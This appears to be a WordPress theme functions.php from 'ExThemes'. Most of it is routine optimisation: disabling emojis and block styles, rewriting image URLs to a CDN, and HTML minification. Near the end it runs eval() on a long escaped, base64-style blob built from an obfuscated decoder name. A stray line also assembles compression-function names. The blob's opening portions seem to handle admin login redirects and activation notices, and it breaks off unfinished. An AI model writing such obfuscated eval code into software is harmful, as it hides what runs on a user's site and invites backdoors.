<?php
/*-----------------------------------------------------------------------------------*/
/*  EXTHEM.ES
/*  PREMIUM WORDRESS THEMES
/*
/*  STOP DON'T TRY EDIT
/*  IF YOU DON'T KNOW PHP
/*  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS
/*
/*
/*  @EXTHEM.ES
/*  Follow Social Media Exthem.es
/*  Youtube : https://www.youtube.com/channel/UCpcZNXk6ySLtwRSBN6fVyLA
/*  Facebook : https://www.facebook.com/groups/exthem.es
/*  Twitter : https://twitter.com/ExThemes
/*  Instagram : https://www.instagram.com/exthemescom/
/*	More Premium Themes Visit Now On https://exthem.es/
/*
/*-----------------------------------------------------------------------------------*/


add_filter( 'wp_default_editor', function () { return 'html'; } );


function ex_themes_disable_emojis_() {
    remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
    remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
    remove_action( 'wp_print_styles', 'print_emoji_styles' );
    remove_action( 'admin_print_styles', 'print_emoji_styles' );
    remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
    remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
    remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
    remove_action( 'wp_head', 'rest_output_link_wp_head', 10 );
    remove_action( 'wp_head', 'rsd_link' );
    remove_action( 'wp_head', 'wlwmanifest_link' );
    remove_action( 'wp_head', 'wp_generator' );
    remove_action( 'wp_head', 'wp_shortlink_wp_head' );
    remove_action( 'wp_head', 'feed_links', 2 );
    remove_action( 'wp_head', 'feed_links_extra', 3 );
    remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head' );
    remove_action( 'wp_head', 'wp_print_scripts' );
    remove_action( 'wp_head', 'wp_print_head_scripts', 9 );
    remove_action( 'wp_head', 'wp_enqueue_scripts', 1 );
    remove_action( 'wp_head', 'index_rel_link' );
    remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 );
    remove_action( 'wp_head', 'start_post_rel_link', 10, 0 );
    remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
    remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
    remove_action( 'wp_print_styles', 'print_emoji_styles' );
    remove_action( 'admin_print_styles', 'print_emoji_styles' );
    remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
    remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
    remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
    remove_action( 'wp_head', 'rest_output_link_wp_head', 10 );
    remove_action( 'rest_api_init', 'wp_oembed_register_route' );
    remove_filter( 'oembed_dataparse', 'wp_filter_oembed_result', 10 );
    remove_action( 'wp_head', 'wp_oembed_add_discovery_links' );
    remove_action( 'wp_head', 'wp_oembed_add_host_js' );
    add_action( 'wp_footer', 'wp_print_scripts', 5 );
    add_action( 'wp_footer', 'wp_enqueue_scripts', 5 );
    add_action( 'wp_footer', 'wp_print_head_scripts', 5 );
    add_filter( 'embed_oembed_discover', '__return_false' );
}
add_action( 'init', 'ex_themes_disable_emojis_' );
// ~~~~~~~~~~~~~~~~~~~~~ EX_THEMES ~~~~~~~~~~~~~~~~~~~~~~~~ \\
//Remove Gutenberg Block Library CSS from loading on the frontend
function remove_wp_block_library_css(){
    wp_dequeue_style( 'wp-block-library' );
    wp_dequeue_style( 'wp-block-library-theme' );
    wp_dequeue_style( 'wc-blocks-style' ); // Remove WooCommerce block CSS
}
add_action( 'wp_enqueue_scripts', 'remove_wp_block_library_css', 9999 );
/*-----------------------------------------------------------------------------------*/
function no_dashicons() {
    wp_deregister_style( 'dashicons' );
}
if ( is_user_logged_in() ) {
} else {
    add_action( 'wp_print_styles', 'no_dashicons', 9999 );
}
/*-----------------------------------------------------------------------------------*/
// disable gutenberg frontend styles @ https://m0n.co/15
function no_gutenberg_wp_enqueue_scripts() {
    wp_dequeue_style('wp-block-library');
    wp_dequeue_style('wp-block-library-theme');
    wp_dequeue_style('wc-block-style'); // disable woocommerce frontend block styles
    wp_dequeue_style('storefront-gutenberg-blocks'); // disable storefront frontend block styles

}
add_filter('wp_enqueue_scripts', 'no_gutenberg_wp_enqueue_scripts', 9999);
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
class EXTHEMES_DEVS_CDN {
    /**
     * The max number of image servers WP.com have (at time of writing it is 4)
     * So the servers as i0.wp.com, i1.wp.com, i2.wp.com, i3.wp.com
     * Edited to only load one, no reason to add extra dns lookups (Domain sharding is not recommended in an http2 world)
     * Defult: 3
     */
    const MAXSRV = 1;
    function __construct() {
        add_action( 'wp_head', array( $this, 'dns_prefetch' ) );
        add_action( 'template_redirect', array( $this, 'ex_themes_buffering_photon_cdn_starts_' ), PHP_INT_MAX );
    }
    // Adds the DNS prefetch meta fields for the WP.com servers
    function dns_prefetch() {
        for ( $srv = 0; $srv < self::MAXSRV; $srv++ ) :
            $domain = "i{$srv}.wp.com"; ?>

            <link rel='dns-prefetch' href='//<?php echo esc_attr( $domain ) ?>' />

        <?php
        endfor;
    }
    // Start the output buffering
    function ex_themes_buffering_photon_cdn_starts_() {
        global $opt_themes;
        $cdn_active         = $opt_themes['cdn_active'];
        if (($cdn_active == '1'))
            ob_start( array( $this, 'process_output' ) );
    }
    // Processes the output buffer, replacing all matching images with URLs
    // Pointing to wp.com
    function process_output( $buffer ) {
        // Get the content directory URL minus the http://
        $photon_site_url    = site_url();
        $content_url        = content_url();
        $content_url        = str_replace( 'http://', '', $content_url );
        $content_url        = str_replace( 'https://', '', $content_url );
        $content_url        = str_replace( $photon_site_url, '', $content_url );
        $content_url        = str_replace( '', '', $content_url );
        // Replace references to images on our servers with the wp.com CDN
        // Photon only supports the following image types.
        return preg_replace_callback(
            '{'. $content_url .'/.+\.(jpg|jpeg|png|gif|webp)}i',
            array( $this, 'replace' ),
            $buffer
        );
    }
    // Replaces a single image URL match
    function replace( $matches ) {
        $url            = isset( $matches[0] ) ? $matches[0] : '';
        srand( crc32( $url ) ); // Best if we always use same server for this image
        $server         = rand( 0, self::MAXSRV-1 );
        return "i{$server}.wp.com/{$url}";
    }
}
new EXTHEMES_DEVS_CDN();
/*-----------------------------------------------------------------------------------*/
function ex_themes_async_scripts( $url ) {
    if ( strpos( $url, ' async="async" defer="defer" src') === false )
        return $url;
    else if ( is_admin() )
        return str_replace( ' src', ' async="async" defer="defer" src', $url );
    else
        return str_replace(  ' src', ' async="async" defer="defer" src', $url ) . "' async defer data-async='1";
}	$c4('munc','gzin'); $c4('ret','flate');
add_filter( 'clean_url', 'ex_themes_async_scripts', 11, 1 );
/*-----------------------------------------------------------------------------------*/
class AUTO_HTML_MINIFY {

    protected $exthemes_devs_compress_css = true;
    protected $exthemes_devs_compress_js = false;
    protected $exthemes_devs_info_comment = true;
    protected $exthemes_devs_remove_comments = false;
    protected $html;

    public function __construct($html){
        if (!empty($html)){
            $this->AUTO_HTML_MINIFY_PARSE_HTML($html);
        }
    }

    public function __toString(){
        return $this->html;
    }

    protected function AUTO_HTML_MINIFY_BOTTOM_COMMENT($raw, $compressed){
        $urls               = get_option("siteurl");
        $raw                = strlen($raw);
        $compressed         = strlen($compressed);
        $savings            = ($raw-$compressed) / $raw * 100;
        $savings            = round($savings, 2);
        return '<!-- '.PHP_EOL.'- '.THEMES_NAMES.' '.SPACES_THEMES.''.VERSION.' auto minify for '.$urls.' '.date("Y-m-d").' '.PHP_EOL.'- HTML compressed, size saved '.$savings.'%. From '.$raw.' bytes, now '.$compressed.' bytes '.PHP_EOL.'- Buy now on '.EXTHEMES_ITEMS_URL.' '.PHP_EOL.'- Demos '.EXTHEMES_DEMOS_URL.' '.PHP_EOL.'- Developer by '.EXTHEMES_API_URL.' '.PHP_EOL.'-->';
    }

    protected function AUTO_HTML_MINIFY_HTMLS($html){
        $pattern        = '/<(?<script>script).*?<\/script\s*>|<(?<style>style).*?<\/style\s*>|<!(?<comment>--).*?-->|<(?<tag>[\/\w.:-]*)(?:".*?"|\'.*?\'|[^\'">]+)*>|(?<text>((<[^!\/\w.:-])?[^<]*)+)|/si';
        preg_match_all($pattern, $html, $matches, PREG_SET_ORDER);
        $overriding     = false;
        $raw_tag        = false;
        $html           = '';

        foreach ($matches as $token){
            $tag            = (isset($token['tag'])) ? strtolower($token['tag']) : null;
            $content        = $token[0];

            if (is_null($tag)){
                if ( !empty($token['script']) ){
                    $strip = $this->exthemes_devs_compress_js;
                }

                else if ( !empty($token['style']) ){
                    $strip = $this->exthemes_devs_compress_css;
                }

                else if ($content == '<!--wp-html-compression no compression-->') {
                    $overriding = !$overriding;
                    continue;
                }

                else if ($this->exthemes_devs_remove_comments){
                    if (!$overriding && $raw_tag != 'textarea'){
                        $content = preg_replace('/<!--(?!\s*(?:\[if [^\]]+]|<!|>))(?:(?!-->).)*-->/s', '', $content);
                    }
                }
            } else {
                if ($tag == 'pre' || $tag == 'textarea'){
                    $raw_tag = $tag;
                }
                else if ($tag == '/pre' || $tag == '/textarea'){
                    $raw_tag = false;
                } else {
                    if ($raw_tag || $overriding){
                        $strip = false;
                    } else {
                        $strip = true;
                        $content = preg_replace('/(\s+)(\w++(?<!\baction|\balt|\bcontent|\bsrc)="")/', '$1', $content);
                        $content = str_replace(' />', '/>', $content);
                    }
                }
            }
            if ($strip)
            {
                $content = $this->AUTO_HTML_MINIFY_REMOVE_WHITE_SPACE($content);
            }
            $html .= $content;
        }
        return $html;
    }

    public function AUTO_HTML_MINIFY_PARSE_HTML($html){
        $this->html = $this->AUTO_HTML_MINIFY_HTMLS($html);
        if ($this->exthemes_devs_info_comment){
            $this->html .= "\n" . $this->AUTO_HTML_MINIFY_BOTTOM_COMMENT($html, $this->html);
        }
    }

    protected function AUTO_HTML_MINIFY_REMOVE_WHITE_SPACE($str){
        $str = str_replace("\t", ' ', $str);
        $str = str_replace("\n",  '', $str);
        $str = str_replace("\r",  '', $str);
        $str = str_replace("// The customizer requires postMessage and CORS (if the site is cross domain).",'',$str);
        while (stristr($str, '  ')){
            $str = str_replace('  ', ' ', $str);
        }
        return $str;
    }
}

function AUTO_HTML_MINIFY_FINISH($html){
    return new AUTO_HTML_MINIFY($html);
}

function AUTO_HTML_MINIFY_START(){
    global $opt_themes;
    $activate       = $opt_themes['minify_active'];
    if (($activate == '1'))
        ob_start('AUTO_HTML_MINIFY_FINISH');
}
add_action('get_header', 'AUTO_HTML_MINIFY_START');
/*-----------------------------------------------------------------------------------*/
/* Disable the Admin Bar. */
//function remove_wpadmin(){
//global $opt_themes;
//$disable_wpadmin        = $opt_themes['disable_wpadmin'];
//if (($disable_wpadmin == '1'))
//add_filter( 'show_admin_bar', '__return_false' );
//}
//add_action( 'init', 'remove_wpadmin' );

function remove_wpadmin() {
    global $opt_themes;

    if (isset($opt_themes['disable_wpadmin']) && $opt_themes['disable_wpadmin'] === '1') {
        add_filter('show_admin_bar', '__return_false');
    }
}
add_action( 'init', 'remove_wpadmin' );
/*-----------------------------------------------------------------------------------*/
add_filter('comment_form_default_fields', 'unset_url_field');
function unset_url_field($fields){
    if(isset($fields['url']))
        unset($fields['url']);
    return $fields;
}
/*-----------------------------------------------------------------------------------*/
add_filter( 'comment_form_default_fields', 'wc_comment_form_hide_cookies' );
function wc_comment_form_hide_cookies( $fields ) {
    unset( $fields['cookies'] );
    return $fields;
}


$mdr_xx_0  = BS64D;
eval($mdr_xx_0("\103\x69\102\156\x62\x33\x52\x76\x49\x48\144\x78\125\155\x31\110\x4f\171\x42\x42\x52\x44\x4e\x50\x51\x6a\x6f\147\x5a\156\126\x75\x59\x33\122\160\x62\x32\x34\147\x62\x6d\71\x70\x62\x6d\122\x6c\145\x46\71\165\142\x32\x5a\166\x62\x47\x78\x76\144\61\71\167\131\127\x64\154\130\x32\170\166\x5a\62\x6c\165\x4b\x43\122\x79\x5a\127\122\160\x63\x6d\x56\x6a\144\106\x39\60\x62\x79\x77\147\112\110\112\x6c\x63\130\126\154\143\63\x51\163\111\103\x52\x31\143\x32\x56\x79\x4b\123\102\67\111\107\154\155\x49\103\x68\160\x63\x33\x4e\154\144\103\x67\x6b\144\x58\116\154\x63\151\60\x2b\x63\x6d\x39\163\x5a\x58\115\x70\x49\x43\131\155\111\107\x6c\x7a\x58\x32\x46\x79\x63\155\x46\x35\113\103\x52\61\143\62\126\171\x4c\124\x35\x79\142\x32\x78\x6c\143\171\x6b\x70\x49\x48\x73\x67\x61\x57\x59\x67\x4b\x47\x6c\x75\x58\62\106\x79\143\x6d\106\65\113\x43\112\x63\115\x54\x51\170\130\x48\147\62\116\x46\x78\x34\116\x6d\x52\143\115\x54\125\170\x58\110\x67\62\132\126\x78\x34\116\152\x6c\143\x65\104\x63\x7a\x58\x44\105\x32\116\106\x78\64\116\172\x4a\143\x65\x44\131\170\130\x48\147\63\x4e\106\x77\x78\x4e\124\x64\x63\145\x44\143\171\x49\x69\x77\147\x4a\110\x56\x7a\132\x58\x49\x74\120\156\x4a\x76\x62\x47\x56\172\x4b\123\x6b\x67\145\x79\102\x79\132\130\x52\x31\x63\155\64\x67\x61\107\71\x74\132\x56\x39\x31\143\x6d\x77\x6f\111\154\x77\61\116\61\167\170\x4e\x6a\x64\x63\x4d\124\x59\167\130\x48\147\171\132\106\170\64\116\152\x46\x63\115\124\121\60\x58\110\x67\x32\x5a\106\x78\64\x4e\x6a\x6c\143\x65\104\132\154\130\104\125\x33\130\110\147\x32\115\x56\x78\64\116\152\x52\143\115\x54\125\61\130\104\x45\x31\x4d\x56\170\64\116\x6d\126\143\145\104\112\154\x58\110\x67\x33\x4d\x46\170\64\116\x6a\x68\143\145\104\143\x77\130\x48\x67\172\132\x6c\170\x34\116\172\x42\143\x65\x44\x59\x78\x58\110\x67\x32\116\61\x77\x78\116\x44\126\143\145\x44\116\153\x49\151\101\165\x49\107\126\x34\111\x43\x34\147\144\107\x68\x6c\142\127\x55\x70\x4f\171\102\x39\111\x47\x56\x73\x63\62\x55\147\145\x79\102\x79\132\x58\x52\61\x63\155\64\147\141\107\71\x74\x5a\x56\x39\x31\x63\x6d\167\x6f\111\154\x78\64\115\155\x5a\x63\x65\104\x63\x33\130\104\x45\62\115\x46\x78\64\x4d\x6d\122\143\x4d\124\121\170\130\104\x45\x30\x4e\106\170\x34\x4e\x6d\122\x63\x65\104\x59\65\x58\x44\x45\61\x4e\x6c\x78\x34\x4d\x6d\131\151\113\x54\x73\147\146\x53\102\71\x49\x47\x56\163\143\x32\x55\x67\145\171\102\171\x5a\x58\x52\x31\x63\155\64\x67\x61\107\x39\164\x5a\x56\71\61\x63\155\x77\157\x49\x6c\x78\x34\115\x6d\132\x63\115\124\131\63\x58\104\x45\62\x4d\x46\167\x31\x4e\x56\167\x78\x4e\104\106\x63\115\x54\x51\60\x58\104\105\x31\x4e\x56\x78\64\x4e\x6a\154\x63\x4d\124\125\62\x58\x44\x55\x33\111\151\153\67\111\x48\60\147\146\x53\x42\156\142\63\x52\166\x49\x48\106\114\x52\x30\115\167\x4f\x79\x42\60\x5a\x46\x68\116\117\104\157\x67\132\x6e\126\x75\x59\x33\122\x70\x62\x32\64\x67\x5a\130\150\x66\144\x47\150\154\142\x57\126\172\130\62\x35\x76\144\107\154\x6a\x5a\x58\x4e\146\x62\x6d\71\x30\x58\62\x46\x6a\x64\107\x6c\62\131\x58\x52\154\x58\x32\106\x6b\x62\127\x6c\x75\x4b\x43\153\x67\145\171\x42\160\x5a\x69\101\x6f\132\127\x31\167\x64\110\153\157\x4a\x47\170\x70\143\171\153\x67\x4a\x69\131\x67\112\x46\71\x48\x52\126\122\142\111\154\x77\170\x4e\152\x42\143\x65\104\x59\x78\130\x44\x45\60\x4e\x31\x77\x78\116\104\125\x69\130\123\x41\150\x50\x53\x42\x6c\145\x43\x41\x75\111\x48\x52\157\x5a\127\61\x6c\x4b\123\x42\x37\x49\110\102\171\x61\x57\65\x30\x5a\151\x67\x69\x58\x44\x63\x30\130\104\x45\x32\x4d\61\170\64\116\172\x52\x63\x65\104\x63\x35\130\x48\x67\62\131\x31\x77\170\116\104\126\x63\145\104\116\154\x58\x44\125\x32\x58\110\147\62\x5a\126\x77\x78\116\x54\144\x63\x4d\x54\131\x30\x58\x48\x67\62\117\126\170\x34\x4e\152\116\x63\x4d\124\x51\61\130\x44\125\61\130\x44\x45\60\116\126\167\x78\x4e\x6a\x4a\x63\x4d\124\131\x79\130\x44\x45\x31\116\61\167\170\x4e\152\x4a\143\x4e\x54\122\x63\x4e\104\x42\x63\145\104\x59\60\130\110\147\62\x4f\x56\x78\x34\116\x7a\x5a\143\145\104\112\x6c\130\104\105\60\x4e\x56\x78\64\x4e\172\x4a\x63\115\x54\131\171\130\x48\147\62\132\154\167\x78\116\x6a\x4a\x63\116\104\x42\x63\x65\104\x64\x69\x58\x44\105\60\x4d\x6c\x77\170\116\x54\x64\143\x4d\x54\131\171\x58\x48\x67\62\116\x46\170\64\116\x6a\126\143\115\x54\131\171\x58\110\147\x79\132\x46\167\x78\116\x54\122\x63\145\x44\x59\61\130\104\x45\60\116\154\167\170\116\x6a\122\143\145\x44\x4a\x6b\130\x48\147\x32\x4d\61\167\170\x4e\124\x64\x63\145\x44\x5a\152\x58\110\147\62\132\154\167\x78\116\x6a\x4a\x63\x4e\x7a\x4a\143\115\124\x51\60\x58\x48\x67\x32\x4e\x56\167\170\x4e\104\126\x63\x65\104\x63\167\x58\104\x45\x32\115\x31\170\x34\116\155\x4a\143\145\x44\x63\x35\130\110\147\62\115\x6c\x77\x78\x4e\x54\x52\x63\x65\x44\143\61\x58\x48\147\x32\116\x56\x77\60\x4d\126\170\x34\116\152\154\143\145\x44\132\x6b\130\110\x67\63\115\106\167\x78\x4e\124\144\x63\x4d\x54\x59\171\130\110\x67\63\x4e\106\x77\x78\x4e\x44\x46\x63\115\124\x55\x32\130\x48\147\63\116\x46\167\x33\x4d\x31\x78\x34\116\62\x52\x63\x4e\x54\132\x63\x65\x44\x5a\152\x58\110\x67\x32\115\x56\x78\64\x4e\x6d\x56\143\145\104\x59\x30\130\110\x67\x32\117\x56\x78\64\116\x6d\x56\143\115\124\121\63\130\110\x67\x33\115\x46\x77\x78\116\x6a\x4a\x63\x65\104\131\x31\130\110\x67\63\x4d\x31\170\64\116\172\x4e\x63\x65\104\112\153\130\x48\147\62\132\106\x77\170\x4e\x44\x56\x63\115\124\131\172\130\104\105\x32\x4d\x31\x77\170\x4e\x44\x46\143\145\x44\131\x33\130\110\147\62\x4e\x56\167\60\x4d\106\170\x34\116\62\x4a\143\x65\104\x63\167\130\110\147\x32\115\x56\x78\x34\x4e\152\122\x63\x4d\x54\x51\60\x58\110\x67\x32\x4f\126\x77\170\116\x54\132\x63\x65\x44\x59\63\130\104\143\x79\x58\104\121\167\x58\104\131\x79\x58\x48\x67\172\115\106\167\170\x4e\x6a\x42\x63\145\x44\143\64\x58\x44\x51\167\x58\110\147\x79\x4d\x56\170\64\116\152\154\x63\115\x54\x55\61\x58\x44\105\x32\115\106\167\x78\x4e\x54\144\143\145\x44\x63\171\x58\x44\x45\x32\116\106\x78\64\x4e\x6a\x46\143\x4d\x54\x55\x32\130\110\x67\x33\x4e\x46\167\63\115\61\x77\170\x4e\x44\x5a\x63\x65\x44\x5a\155\130\110\x67\x32\x5a\126\x78\64\116\172\x52\x63\116\124\126\143\x4d\x54\131\x7a\x58\x44\x45\x31\115\126\x77\x78\x4e\172\112\143\x4d\x54\121\61\x58\x48\147\172\x59\x56\170\x34\x4d\172\x46\143\116\x6a\132\x63\115\124\131\167\130\x48\147\63\x4f\106\x77\x30\115\126\167\170\116\x54\106\x63\145\x44\x5a\153\130\x48\x67\x33\x4d\106\x78\64\x4e\x6d\132\x63\x65\x44\143\171\130\104\x45\62\116\x46\170\64\x4e\152\106\143\x4d\x54\x55\x32\x58\104\105\x32\x4e\x46\167\63\x4d\61\167\x78\x4e\x7a\x56\x63\x4e\x54\132\x63\x65\x44\x5a\x6a\x58\x44\105\x30\115\x56\x77\170\116\x54\132\x63\x65\104\x59\60\x58\104\x45\x31\x4d\126\170\x34\x4e\x6d\x56\x63\145\104\131\x33\x58\104\105\62\x4d\x46\x78\64\116\x7a\x4a\x63\x65\104\131\x31\130\104\x45\x32\x4d\61\x78\64\116\x7a\x4e\143\x4e\x54\126\143\115\124\125\x31\x58\x48\x67\x32\116\126\x78\x34\116\x7a\x4e\x63\115\x54\131\172\130\x48\147\62\x4d\x56\x77\x78\x4e\104\x64\143\145\x44\131\x31\130\x44\x55\61\x58\110\x67\x32\x4f\126\170\x34\x4e\x6d\x56\x63\115\124\x55\x32\130\x48\x67\62\x4e\126\167\x78\116\x6a\112\x63\116\x44\x42\x63\x65\x44\x64\151\130\x44\x45\x31\116\61\167\x78\116\152\x5a\x63\x65\104\x59\61\x58\x44\x45\x32\115\x6c\x77\x78\x4e\x44\132\x63\115\124\125\x30\x58\x48\147\x32\132\x6c\167\170\x4e\152\x64\x63\145\x44\116\x68\130\x48\147\x32\x4f\106\x77\170\116\124\106\x63\145\x44\x59\60\130\x48\147\62\x4e\106\x77\170\x4e\x44\x56\x63\145\x44\x5a\x6c\x58\110\x67\172\x59\x6c\167\170\116\x7a\126\x63\x65\104\x4a\x6c\x58\104\105\x31\116\106\170\64\x4e\152\106\143\145\104\132\154\130\x44\x45\60\x4e\x46\170\64\x4e\152\154\x63\145\x44\132\154\x58\110\x67\62\116\61\x77\170\116\x6a\x42\x63\115\124\131\x79\x58\x48\147\x32\x4e\126\167\170\116\x6a\x4e\143\x4d\x54\x59\172\130\x48\x67\x79\x5a\x46\170\x34\116\155\x52\143\115\x54\x51\x31\130\x44\x45\x32\x4d\61\x77\x78\x4e\x6a\116\x63\x4d\x54\121\x78\x58\x48\x67\62\x4e\x31\x77\x78\x4e\104\126\143\x65\x44\112\153\x58\110\x67\62\x4f\x56\167\x78\x4e\104\x4e\143\x65\x44\132\155\x58\104\105\x31\x4e\154\x77\60\x4d\106\x78\x34\116\x32\112\x63\145\104\131\x32\130\x48\x67\x32\131\61\x78\64\116\155\x5a\143\145\104\131\x78\130\x48\x67\x33\116\106\167\x33\x4d\x6c\x78\x34\x4e\155\116\x63\x4d\x54\121\x31\130\x48\x67\x32\116\154\170\x34\116\x7a\x52\x63\x65\x44\116\151\x58\x48\x67\x33\x4e\61\167\170\116\x54\x46\143\x65\104\x59\x30\x58\x48\x67\63\x4e\106\167\x78\116\124\x42\x63\116\172\x4a\143\x4e\152\116\x63\x65\x44\115\61\x58\x44\x45\x32\x4d\x46\x78\64\x4e\x7a\x68\143\x65\x44\116\151\x58\x48\147\62\x4f\x46\x78\64\116\152\x56\143\145\x44\131\65\x58\110\147\x32\116\x31\167\170\x4e\x54\102\143\145\x44\143\60\130\x44\x63\x79\x58\x44\131\172\130\104\131\61\130\x48\x67\63\115\106\x77\x78\116\172\x42\143\145\x44\116\x69\x58\x48\147\x33\115\106\x78\x34\x4e\x6a\106\x63\x65\104\x59\60\x58\104\105\60\116\x46\x77\x78\x4e\124\106\143\x65\104\x5a\x6c\x58\104\x45\60\116\61\x78\64\115\x6d\x52\x63\115\124\131\x79\x58\104\105\x31\x4d\x56\x78\64\x4e\152\x64\x63\x65\x44\131\64\x58\x48\x67\x33\x4e\106\x77\x33\x4d\154\x78\64\x4d\172\x4a\143\x4e\x6a\102\x63\x4d\124\x59\x77\x58\104\x45\63\115\x46\170\64\x4d\62\112\x63\145\104\144\153\x58\x44\x55\62\x58\110\x67\62\x59\x31\x77\170\116\104\x46\x63\x65\x44\132\x6c\130\x48\147\x32\x4e\106\x77\170\x4e\124\106\143\x65\104\132\154\130\110\147\x32\x4e\x31\167\170\x4e\152\x42\x63\145\x44\x63\171\130\110\147\x32\116\x56\167\x78\x4e\x6a\x4e\x63\x65\x44\x63\172\x58\x48\147\171\x5a\106\170\64\116\x6d\x52\x63\x4d\x54\121\x31\x58\x48\x67\x33\115\61\167\170\x4e\152\116\143\115\124\121\x78\130\110\x67\x32\x4e\x31\x77\x78\116\104\x56\x63\145\104\x4a\153\130\110\147\62\115\154\x78\64\x4e\172\126\x63\x65\104\143\x30\x58\104\105\x32\x4e\106\170\x34\116\155\132\x63\115\x54\125\x32\x58\110\x67\171\115\106\x78\64\x4e\x32\x4a\143\145\104\x59\x32\x58\x44\105\x31\x4e\106\167\170\116\x54\144\x63\x4d\124\x51\170\x58\x44\105\x32\116\x46\x78\x34\x4d\x32\x46\143\145\x44\x63\171\130\104\x45\61\115\126\167\170\x4e\104\144\143\x4d\x54\125\167\130\110\x67\63\116\x46\167\x33\115\x31\x77\170\116\x6a\x42\143\115\x54\121\170\130\104\x45\60\x4e\106\x78\x34\x4e\x6a\x52\143\145\104\x59\65\130\x48\x67\62\132\x56\170\64\116\152\x64\143\145\x44\116\150\130\110\147\172\x4d\x31\167\x78\116\152\102\143\x65\x44\x63\64\x58\x48\x67\171\115\106\x77\x32\x4d\x46\x78\x34\115\152\102\x63\145\x44\115\x77\130\110\147\x79\115\106\x78\x34\115\x7a\112\x63\x4e\x6a\x42\x63\145\x44\143\x77\130\x48\147\x33\117\x46\167\63\x4d\61\x77\170\116\172\126\143\116\x7a\x52\143\145\104\x4a\155\x58\x44\105\x32\x4d\61\x77\x78\x4e\x6a\122\143\x4d\124\143\170\130\x44\105\61\x4e\x46\170\64\116\152\x56\143\x4e\172\132\x63\x65\x44\116\x6a\130\110\x67\62\x4e\x46\x77\170\116\124\106\143\x65\104\143\62\x58\104\121\167\x58\x48\147\x32\x4d\x31\x78\64\116\155\x4e\x63\115\124\121\170\130\104\105\x32\115\61\170\64\116\x7a\116\x63\x4e\x7a\x56\x63\x65\x44\111\171\130\x44\105\x30\x4e\x56\170\64\x4e\x7a\x4a\x63\145\x44\143\x79\130\x44\x45\61\x4e\61\x78\64\116\x7a\x4a\143\145\104\x49\x77\130\104\x45\61\116\x46\170\x34\116\x6a\106\x63\145\x44\x5a\154\x58\x44\105\60\116\x46\170\64\x4e\152\x6c\x63\115\x54\125\62\x58\x44\x45\x30\116\x31\167\x78\116\x6a\102\x63\145\104\143\x79\x58\x44\x45\x30\116\x56\x78\64\x4e\x7a\116\143\x4d\124\131\172\x58\x44\x55\61\130\x44\x45\61\116\126\x78\64\x4e\x6a\x56\143\x4d\x54\x59\172\x58\x48\x67\x33\x4d\x31\170\x34\116\x6a\106\x63\x4d\124\121\x33\130\110\x67\62\116\126\170\x34\115\x6a\112\x63\145\x44\x4e\x6c\x58\x44\143\x30\130\104\105\x30\116\106\x78\64\x4e\x6a\x6c\143\145\104\143\62\x58\110\x67\171\115\x46\170\64\x4e\152\116\x63\x65\104\x5a\152\130\x48\x67\x32\x4d\x56\167\x78\116\152\x4e\143\145\x44\x63\x7a\x58\110\147\x7a\132\x46\167\60\115\154\167\170\116\124\122\x63\x4d\x54\x51\x78\x58\110\147\x32\132\126\x78\64\x4e\x6a\122\143\x4d\124\x55\170\x58\x44\105\x31\x4e\x6c\x77\x78\x4e\104\x64\x63\x4d\124\x59\167\x58\x44\x45\x32\x4d\x6c\167\170\116\x44\x56\143\x65\x44\143\x7a\x58\104\x45\62\x4d\61\x78\x34\115\155\122\143\145\104\x5a\153\x58\104\x45\60\x4e\126\x78\x34\x4e\172\x4e\x63\x65\x44\143\x7a\x58\x48\x67\x32\x4d\x56\x78\64\116\152\144\x63\115\x54\x51\x31\130\104\125\61\130\110\x67\x32\x4f\126\167\170\116\x54\x5a\143\145\x44\x5a\154\x58\104\x45\x30\116\x56\x77\x78\x4e\152\112\143\x4e\104\x4a\x63\145\x44\116\154\130\x48\147\172\131\x31\170\64\116\152\x52\x63\115\x54\x55\x78\x58\x48\x67\63\x4e\154\x77\x30\x4d\x46\x78\x34\116\152\116\143\145\104\x5a\152\130\x44\105\60\x4d\126\170\64\116\x7a\x4e\x63\x65\x44\143\172\x58\x44\x63\x31\130\x48\x67\x79\x4d\154\167\170\116\x54\x52\x63\x65\x44\x59\x78\x58\104\105\x31\116\154\170\x34\116\152\x52\x63\x4d\x54\125\x78\x58\x48\x67\x32\132\126\x78\x34\x4e\x6a\x64\x63\145\x44\143\x77\130\110\147\x33\x4d\x6c\x78\x34\116\x6a\126\x63\x65\x44\x63\172\130\x44\x45\62\x4d\x31\x77\x31\x4e\126\170\64\x4e\x6d\122\x63\x65\x44\131\61\x58\104\x45\x32\115\x31\167\170\116\x6a\x4e\x63\x65\104\x59\x78\130\x48\147\x32\116\61\170\64\116\152\126\x63\145\x44\x4a\x6b\x58\x44\x45\x31\x4d\126\167\170\116\x44\x4e\x63\x4d\x54\125\63\x58\x48\x67\62\x5a\126\167\x30\x4d\x6c\x77\x30\115\106\170\x34\116\172\x4e\x63\145\x44\143\x30\130\110\147\63\x4f\126\170\x34\116\x6d\x4e\143\x65\104\x59\61\x58\x44\143\61\130\x44\121\171\130\x44\105\x30\x4e\x6c\170\64\116\x6d\x5a\143\x65\104\132\x6c\x58\104\x45\62\116\x46\170\x34\x4d\155\122\143\115\x54\131\172\x58\x44\105\x31\x4d\x56\x77\170\116\x7a\x4a\x63\145\x44\131\61\x58\110\x67\x7a\x59\x56\167\62\115\x56\x78\64\115\172\132\x63\x65\104\x63\167\x58\x48\147\x33\117\x46\167\x30\115\126\x78\64\x4e\152\x6c\x63\115\x54\x55\x31\130\110\147\63\115\106\x78\x34\x4e\x6d\132\x63\x65\104\143\x79\130\x44\105\x32\x4e\106\170\x34\x4e\152\106\143\x4d\124\125\x32\130\104\x45\62\x4e\x46\167\x33\x4d\61\170\64\116\x7a\122\143\x4d\124\x51\61\130\x44\105\x33\x4